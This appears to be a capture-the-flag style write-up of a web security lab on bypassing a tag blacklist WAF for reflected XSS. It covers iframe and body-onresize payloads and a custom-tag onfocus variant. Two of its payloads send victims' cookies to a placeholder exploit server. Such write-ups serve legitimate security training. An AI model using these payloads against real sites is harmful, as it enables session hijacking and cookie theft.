# Reflected XSS into HTML context with most tags and attributes blocked (WAF bypass) + EXTRA: customtags

We found that there is a WAF using a blacklist of HTML tags

[portswigger - tags and events to copy in intruder](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

Using Burp Intruder and the response status codes, we identify which tags are allowed.

- 1: First, we find allowed tags.

- 2: Second, we search for allowed attributes.

- 3: We create the payload.

<br>

![Screenshot1](/04-Screenshots/wafbypass1.png)

![Screenshot2](/04-Screenshots/wafbypass2.png)

<br>

**Exploitation**

>❗ It is important to note that our own iframe is not affected by the blacklist, so we can use events such as onload. 

We deliver the following script from our server:

```js
<iframe src="https://<IP>/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'></iframe>
```

Let’s analyze what we are doing:

- We create an iframe pointing to the victim web application.

- We use the *body* tag and the *onresize event*, which *are not blacklisted* by the WAF.

- To force a resize without user interaction, we add an onload handler on the iframe.

> onload might be blocked by the victim domain’s WAF if it were routed through that WAF, but because the onload handler runs from our server it does not pass through the victim’s WAF.

Example to exfiltrate cookies:
if doesn't works try url-code
```js
<iframe
  src="https://<IP>/?search="><body onresize=fetch('https://<EXPLOIT-SV>/exploit/?cookie='+btoa(document.cookie),{mode:'no-cors'})>"
  onload="this.style.width='1px';this.offsetWidth;this.style.width='500px'">
</iframe>
```

**EXTRA -> EJEMPLO CUSTOM TAGS**

POC
```html
custom-tag onfocus="alert(1)" id="x" tabindex="1">
https://<IP>?search=custom-tag onfocus="alert(1)" id="x" tabindex="1">#x
```

```js
<script> 
location = 'https://<IP>/?search=<xss id=x onfocus="fetch(\'https://<EXPLOIT-SV>/?cookie=\' btoa(document.cookie),{mode:'no-cors'})" tabindex=1>#x'; 
</script>
```